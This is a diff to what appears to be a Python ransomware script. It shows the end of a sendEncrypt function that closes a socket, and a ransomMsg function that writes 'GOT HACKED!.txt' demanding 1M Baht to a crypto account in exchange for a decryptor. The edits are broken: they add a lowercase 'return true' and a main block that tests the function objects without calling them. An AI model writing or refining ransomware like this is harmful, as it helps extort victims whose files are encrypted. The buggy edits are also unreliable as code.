@@ -170,12 +170,13 @@ def sendEncrypt():
 
     finally:
         s.close()
+    return true
 
 def ransomMsg():
     filename = "GOT HACKED!.txt"
 
     with open(filename, "w", encoding="utf-8") as file:
-        file.write("You've been hacked. Send 1 M Baht to this Crypto Account: fdsfjdskjWEJFOJF1235489 then I'll give you the decryptor")
+        file.write("You've been hacked. Send 1M Baht to this Crypto Account: fdsfjdskjWEJFOJF1235489 then I'll give you the decryptor")
 
     try:
         if sys.platform == "win32":
@@ -188,5 +189,5 @@ def ransomMsg():
         print(e)
 
 if __name__ == '__main__':
-    sendEncrypt()
-    ransomMsg()
+    if (sendEncrypt):
+        ransomMsg
